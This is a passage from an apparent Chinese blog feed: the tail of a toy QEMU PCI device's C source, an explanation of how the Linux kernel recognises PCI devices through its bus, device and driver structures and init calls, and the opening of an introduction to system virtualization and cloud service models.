&amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *(<span class="hljs-type">uint16_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *(<span class="hljs-type">uint32_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_STATUS:<br>            <span class="hljs-keyword">return</span> ds-&gt;regs[A3DEV_REGS_STATUS];<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    qemu_mutex_lock(&amp;ds-&gt;lock);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_INSN:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_START:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_RUNNING;<br>                qemu_thread_create(&amp;ds-&gt;thread, <span class="hljs-string">&quot;a3dev-worker-thread&quot;</span>, <br>                                    a3dev_worker_thread, ds, <br>                                    QEMU_THREAD_DETACHED);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_STOP:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_RUNNING) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_STOPPING;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    qemu_mutex_unlock(&amp;ds-&gt;lock);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_pci_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_INIT;<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_REGS_TYPES);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ds-&gt;enc_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    qemu_mutex_init(&amp;ds-&gt;lock);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_pci_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><h2 id="一、kernel-识别-PCI-设备的方式"><a href="#一、kernel-识别-PCI-设备的方式" class="headerlink" title="一、kernel 识别 PCI 设备的方式"></a>一、kernel 识别 PCI 设备的方式</h2><h3 id="I-基本结构"><a href="#I-基本结构" class="headerlink" title="I.基本结构"></a>I.基本结构</h3><p>我们首先来看 Linux kernel 中的通用设备驱动模型，主要由三部分组成：<strong>总线（bus）、设备（device）、驱动（driver）</strong>，具体的总线类型都是基于这一套机制去实现的</p><p><img src="https://s2.loli.net/2022/09/01/ypQ8KYmIzbZkaUd.png" alt="偷的图"></p><p>对于 PCI 而言，总线中的各个组件在 Linux kernel 中对应的结构体如下图所示：</p><p><img src="https://s2.loli.net/2022/09/01/JtUKnCN7d1BWpxz.png" alt="偷的图"></p><p>下面是一张更加详细的展开图：</p><p><img src="https://s2.loli.net/2022/09/01/y5if1YWOesXJbT3.png" alt="偷的图"></p><p>上面的图只画出了 PCI 的总线（<code>struct pci_bus</code>）与 PCI 设备（<code>struct pci_dev</code>），还少了一个驱动结构，在内核中 PCI 驱动对应的实际上是 <code>pci_driver</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">node</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> *<span class="hljs-title">id_table</span>;</span><span class="hljs-comment">/* Must be non-NULL for probe to be called */</span><br><span class="hljs-type">int</span>  (*probe)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id);<span class="hljs-comment">/* New device inserted */</span><br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device removed (NULL if not a hot-plug capable driver) */</span><br><span class="hljs-type">int</span>  (*suspend)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">pm_message_t</span> state);<span class="hljs-comment">/* Device suspended */</span><br><span class="hljs-type">int</span>  (*resume)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device woken up */</span><br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> pci_dev *dev);<br><span class="hljs-type">int</span>  (*sriov_configure)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">int</span> num_vfs); <span class="hljs-comment">/* On PF */</span><br><span class="hljs-type">int</span>  (*sriov_set_msix_vec_count)(<span class="hljs-keyword">struct</span> pci_dev *vf, <span class="hljs-type">int</span> msix_vec_count); <span class="hljs-comment">/* On PF */</span><br>u32  (*sriov_get_vf_total_msix)(<span class="hljs-keyword">struct</span> pci_dev *pf);<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_error_handlers</span> *<span class="hljs-title">err_handler</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">groups</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">dev_groups</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device_driver</span><span class="hljs-title">driver</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dynids</span><span class="hljs-title">dynids</span>;</span><br><span class="hljs-type">bool</span> driver_managed_dma;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="II-识别过程"><a href="#II-识别过程" class="headerlink" title="II.识别过程"></a>II.识别过程</h3><p>讲完了基本结构，现在我们可以来看内核是怎么去识别 PCI 设备的了，在内核启动后各架构的初始化函数最终都会调用到 <code>start_kernel()</code>，于是存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">start_kernel</span>()<br><span class="hljs-built_in">arch_call_rest_init</span>()<br><span class="hljs-built_in">rest_init</span>()<span class="hljs-comment">// 启动三个进程 idle（0）、kernel_init（1）、kthreadd（2）</span><br><span class="hljs-built_in">kernel_init</span>()<br><span class="hljs-built_in">kernel_init_freeable</span>()<br><span class="hljs-built_in">do_basic_setup</span>()<br><span class="hljs-built_in">driver_init</span>()<br><span class="hljs-built_in">devtmpfs_init</span>()<span class="hljs-comment">// 建立 devtmpfs，之后会被用户态init挂到/dev下面</span><br><span class="hljs-built_in">buses_init</span>()<span class="hljs-comment">// 在 sysfs 根下建立 bus 目录</span><br></code></pre></td></tr></table></figure><p>之后就是到各个模块的 init 函数，按照编译链接顺序，我们所关心的 PCI 相关函数的执行顺序应当如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pcibus_class_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 pci_bus class，创建 sysfs 下的 class/pci_bus 目录</span><br>↓<br><span class="hljs-function"><span class="hljs-title">pci_driver_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 pci_bus_type，创建 sysfs 下的 bus/pci 目录</span><br>↓<br><span class="hljs-function"><span class="hljs-title">acpi_pci_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 acpi_pci_bus，并设置电源管理的相应操作</span><br>↓<br><span class="hljs-function"><span class="hljs-title">acpi_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// pcie 初始化入口，进行设备识别与模型建立</span><br></code></pre></td></tr></table></figure><p>这里我们挑其中关键的几个来看，首先是 <code>acpi_init()</code>，存在如下调用路径：</p><blockquote><p>前置知识：ACPI 规范</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">acpi_init</span>()<br><span class="hljs-built_in">pci_mmcfg_late_init</span>() <span class="hljs-comment">// 扫描 MCFG 表，获取所有设备PCI配置空间的基地址</span><br><span class="hljs-built_in">acpi_scan_init</span>()<br><span class="hljs-built_in">acpi_pci_root_init</span>()<br><span class="hljs-built_in">acpi_scan_add_handler_with_hotplug</span>()<span class="hljs-comment">// 添加 handler：pci_root_handler</span><br><span class="hljs-built_in">acpi_bus_scan</span>()<span class="hljs-comment">// 设备扫描，创建 ACPI 设备节点对象</span><br><span class="hljs-built_in">acpi_bus_attach</span>()<span class="hljs-comment">// 处理单个节点并调用 acpi_bus_attach() 处理子节点（DFS）</span><br><span class="hljs-built_in">acpi_scan_attach_handler</span>()<span class="hljs-comment">// 查找匹配的 handler 并调用 attach 指针</span><br>handler-&gt;<span class="hljs-built_in">attach</span>(device, devid)<br></code></pre></td></tr></table></figure><p>那么现在我们来看对应的 handler，为在 <code>acpi_scan_add_handler_with_hotplug()</code> 中注册的 <code>pci_root_handler</code> ，该变量定义于 <code>/drivers/acpi/pci_host.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">acpi_scan_handler</span> <span class="hljs-title">pci_root_handler</span> =</span> &#123;<br>.ids = root_device_ids,<br>.attach = acpi_pci_root_add,<br>.detach = acpi_pci_root_remove,<br>.hotplug = &#123;<br>.enabled = <span class="hljs-literal">true</span>,<br>.scan_dependent = acpi_pci_root_scan_dependent,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>于是最后调用到 <code>acpi_pci_root_add()</code>，为设备节点创建对应的内核结构体</p><blockquote><p>这个函数中间其实还有一些过程，<del>但是👴摸了</del></p></blockquote><p>接下来我们来看 <code>pci_driver_init()</code>，该函数在内核驱动模型中注册了 PCI 总线，并定义了相关的操作函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">pci_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = bus_register(&amp;pci_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PCIEPORTBUS</span><br>ret = bus_register(&amp;pcie_port_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>dma_debug_add_bus(&amp;pci_bus_type);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>postcore_initcall(pci_driver_init);<br></code></pre></td></tr></table></figure><p>该函数中调用了 <code>bus_register()</code> 来注册 PCI 总线，对应到符合内核设备驱动模型的总线类型的变量为 <code>pci_bus_type</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus_type</span> <span class="hljs-title">pci_bus_type</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;pci&quot;</span>,<br>.match= pci_bus_match,<br>.uevent= pci_uevent,<br>.probe= pci_device_probe,<br>.remove= pci_device_remove,<br>.shutdown= pci_device_shutdown,<br>.dev_groups= pci_dev_groups,<br>.bus_groups= pci_bus_groups,<br>.drv_groups= pci_drv_groups,<br>.pm= PCI_PM_OPS_PTR,<br>.num_vf= pci_bus_num_vf,<br>.dma_configure= pci_dma_configure,<br>.dma_cleanup= pci_dma_cleanup,<br>&#125;;<br>EXPORT_SYMBOL(pci_bus_type);<br></code></pre></td></tr></table></figure><h2 id="二、设备驱动框架"><a href="#二、设备驱动框架" class="headerlink" title="二、设备驱动框架"></a>二、设备驱动框架</h2><h2 id="三、PCI-probe-设备识别"><a href="#三、PCI-probe-设备识别" class="headerlink" title="三、PCI probe - 设备识别"></a>三、PCI probe - 设备识别</h2><h2 id="四、PCI-remove-设备移除"><a href="#四、PCI-remove-设备移除" class="headerlink" title="四、PCI remove - 设备移除"></a>四、PCI remove - 设备移除</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;👴等会把你总线都给扬了&lt;/p&gt;</summary>
    
    
    
    <category term="HARDWARE" scheme="http://blog.arttnba3.cn/categories/HARDWARE/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="计算机组成原理" scheme="http://blog.arttnba3.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="Linux Driver" scheme="http://blog.arttnba3.cn/tags/Linux-Driver/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x02】系统虚拟化导论</title>
    <link href="http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/"/>
    <id>http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/</id>
    <published>2022-08-28T20:39:22.000Z</published>
    <updated>2022-09-04T16:44:45.982Z</updated>
    
    <content type="html"><![CDATA[<p>虚拟化方向YLG速成入门指北</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>因为笔者最近不知道为什么开始做 X86 虚拟化这一块的工作了（大雾），而虚拟化的知识点比较杂也比较乱，所以特地开这一篇博客简单记录一下虚拟化的一些基本概念</p><h1 id="0x01-Virtualization-Basis"><a href="#0x01-Virtualization-Basis" class="headerlink" title="0x01. Virtualization Basis"></a>0x01. Virtualization Basis</h1><h2 id="一、虚拟化的基本概念"><a href="#一、虚拟化的基本概念" class="headerlink" title="一、虚拟化的基本概念"></a>一、虚拟化的基本概念</h2><p>什么是虚拟化？狭义地说，大家在日常生活中说到的虚拟化主要指的还是 <em>虚拟机</em> （Virtual Machine），即<strong>通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</strong>——这其实是虚拟化技术中的一个抽象粒度为单个计算机的分支：<code>系统虚拟化</code></p><p>在计算机科学当中，<strong>虚拟化</strong>（Virtualization）指的其实是一种「<strong>将计算机的各种实体资源进行逻辑抽象，从而呈现出不同的虚拟资源</strong>」的资源管理技术。利用虚拟化技术，我们可以打破实体结构间不可切割的特性——一份实体资源可以对用户呈现为多份虚拟资源，多份实体资源也可以呈现为一份物理资源。</p><p>通过虚拟化技术，我们可以实现资源的动态分配、灵活调度、跨域共享等，从而提高资源的利用率。</p><p><img src="https://s2.loli.net/2022/08/09/Tj6qGVH82suwhMy.png" alt="image.png"></p><blockquote><p>这里所说的实体资源包括<strong>CPU、内存、磁盘空间、网络适配器</strong>等。</p></blockquote><p>这里笔者摘抄一段来自一本经典的虚拟化技术教材的叙述：</p><blockquote><p>抽象来说，虚拟化是资源的逻辑表示，它不受物理限制的约束。具体来说，虚拟化技术的实现形式是在系统中加入一个虚拟层，虚拟化层将下层的资源抽象成另一形式的资源，提供给上层使用。通过空间上的分割、时间上的分时以及模拟，虚拟化可以将一份资源抽象成多分。反过来，虚拟化也可以将多份资源抽象成一份。</p><p>——《系统虚拟化：原理与实现》</p></blockquote><p>即虚拟化技术的实现其实源自于现代计算机系统自下而上的多层抽象的结构：「<strong>每个层次都向上一层次呈现一个抽象，每一层只需要知道下层的抽象接口，而无需了解其内部运作机制</strong>」——我们不难想到的是，<strong>只要我们能够通过某种方式向上层提供表现相同的抽象接口，在上层看来我们就是正常的该层所提供的资源，从而就实现了对该层的虚拟化。</strong></p><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png" alt="image.png"></p><p>由此，从物理层与虚拟层的两侧来看，我们便有了虚拟化中的两个重要定语：</p><ul><li>「<strong>Host</strong>」：物理资源方</li><li>「<strong>Guest</strong>」：虚拟资源方</li></ul><p>根据资源的不同，在这两个定语之后我们可以接不同的名词：例如我们将一台物理机器称之为 <code>Host Machine</code> （宿主机），将运行在其上的虚拟机称之为 <code>Guest Machine</code> （客户机）；相应地，在宿主机上若运行有操作系统，则称之为 <code>Host OS</code>，而运行在虚拟机中的操作系统称之为 <code>Guest OS</code></p><p>由此，我们将位于不同抽象层上的虚拟化分为如下类：</p><ul><li><strong>硬件抽象层上的虚拟化</strong>：通过虚拟硬件抽象层来实现虚拟机器，为 Guest OS 呈现与物理硬件相同或相类似的硬件抽象层，也称之为「<strong>系统级虚拟化</strong>」（例如VMWare、Xen）</li><li>操作系统层上的虚拟化：通常指的是操作系统内核可以提供多个互相隔离的用户态实例（通常称之为容器），这些用户态实例对其用户而言就像是一台真实的计算机，有着自己独立的网络、文件系统等（例如 VServer）</li><li>库函数层上的虚拟化：通过虚拟化操作系统的应用级库函数的服务接口，使得应用程序不需要修改就可以在不同的操作系统中无缝运行（例如 Wine、WSL）</li><li>编程语言层上的虚拟化：这类虚拟机运行的是进程级别的不存在于硬件上的虚拟体系结构，其程序代码由虚拟机的运行时支持系统<strong>翻译</strong>成机器语言后再执行，属于进程级的虚拟化（例如 JVM）</li></ul><blockquote><p>例如 Linux kernel 当中的 VFS 便是非常符合虚拟化这一概念的子系统：从上层调用的角度而言，我们所看到的都是统一的 API 接口，不同文件系统的具体实现则被隐藏在了 VFS 层的下方。我们只需要知道在这一抽象层中 open、read、write 等抽象 API 的用法，而无需关注底层的 ext4 或是 ntfs 的内部实现。</p><p>虚拟化亦是如此，从 Guest 侧我们所能看到的也只是统一的虚拟资源的接口，或者说 Host 为我们呈现出了虚拟化的资源接口，其表现的行为与实体设备是一致的。</p></blockquote><p>我们日常所说的虚拟化技术主要是<strong>硬件抽象层上的虚拟化</strong>，即「<strong>系统级虚拟化</strong>」：通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</p><p>针对实体资源类型的不同，我们还可以再细分为：</p><ul><li><strong>计算虚拟化</strong>：针对 CPU 和内存资源进行虚拟化</li><li><strong>网络虚拟化</strong>：针对网络链路资源进行虚拟化</li><li><strong>IO虚拟化</strong>：针对 IO 资源进行虚拟化</li><li><strong>存储虚拟化</strong>：针对磁盘存储资源虚拟化</li></ul><h2 id="二、虚拟化与云计算"><a href="#二、虚拟化与云计算" class="headerlink" title="二、虚拟化与云计算"></a>二、虚拟化与云计算</h2><p>说到虚拟化就不得不提云计算这一“新兴事物”（其实在笔者写下这句话的时候云计算技术已经发展多年了hhh），似乎每次提到云计算总是离不开虚拟化这个词，那先来和笔者一起看一下「什么是云计算吧」（笑）</p><ul><li>「<strong>云计算</strong>」（Cloud computing）即<strong>通过网络向用户按需提供可动态伸缩的计算服务与 IT 资源</strong>，云服务厂商将多份实体资源以一定形式进行整合后，将其称之为「<strong>云</strong>」，通过互联网按需向用户提供其所需的资源</li></ul><p>相信大家已经注意到其相似之处了——<strong>虚拟化技术便是云计算服务的技术基石之一</strong></p><ul><li>通过虚拟化可以解决数据中心（IDC）资源整合的问题，对计算、存储等资源进行标准化</li><li>通过虚拟化可以将资源进行更为合理的切割调度，从而充分利用硬件资源</li></ul><p><img src="https://s2.loli.net/2022/08/08/5ncJFCOLByoqbPM.png" alt="image.png"></p><blockquote><p>当然云计算的基石不仅仅是虚拟化，但是这篇博客主要讲的还是系统虚拟化而不是云计算（笑）</p></blockquote><p>根据提供的资源服务的类型不同，我们将云服务分为以下三种类型：</p><ul><li><p><strong>Infrastructure-as-a-Service</strong>（IaaS）：云厂商向用户提供<strong>完整的基础设施</strong>，即提供<strong>云硬件环境</strong>，包括计算（CPU）、存储（硬盘）、网络等，用户需要自行在云硬件环境上搭建自己需要的服务</p><blockquote><p>通俗点说就是卖服务器（笑）</p></blockquote></li><li><p><strong>Platform-as-a-Service</strong>（PaaS）：云厂商向用户提供<strong>软件部署平台</strong>，即提供服务器平台或者开发环境，用户可以直接在云平台上进行开发部署等工作，<strong>而无需管理底层的基础设施</strong></p><blockquote><p>比如说微软的 Azure 和 Redhat 的 OpenShift</p></blockquote></li><li><p><strong>Software-as-a-Service</strong>（SaaS）：云厂商向用户提供<strong>具体的软件服务</strong>，用户可以通过网络直接使用厂商提供的服务</p><blockquote><p>比如说腾讯的共享文档就是一个典型的 SaaS</p></blockquote></li></ul><p><img src="https://s2.loli.net/2022/08/07/nF3wLu5cfZQtpPK.png" alt="image.png"></p><p>我们按照其部署形式的不同还可以将云分为以下三类：</p><ul><li><strong>公有云</strong>：云服务的基础设施部署在云厂商的机房里，由云厂商向用户提供云上资源，<strong>云资源实体由多个用户共享</strong>（一台物理服务器上可能跑多个用户的虚拟机）</li><li><strong>私有云</strong>：云服务的基础设施部署在用户自己的机房里（部署在内部自有机房的叫内部私有云，部署在外部托管机房的叫外部私有云），由云厂商提供部署服务或是用户自行部署，<strong>云资源实体由用户独享</strong></li><li><strong>混合云</strong>：用户在使用云厂商提供的云资源的同时自己也搭建了一个云</li></ul><p><img src="https://s2.loli.net/2022/08/07/SrJDGa6shAWq4ul.png" alt="image.png"></p><blockquote><p>现在网上各种关于云计算的文章包括像百度百科这样的，<strong>几乎没有一个能准确给这个概念下一个最基本的定义的</strong>，全篇都是各种假大空的套话，看着让人血压升高……</p><blockquote><p><del>👴觉得百度百科就是个🐓⑧</del></p></blockquote><p>云计算本质上其实就是一个通过互联网向用户按需提供可动态伸缩的 IT 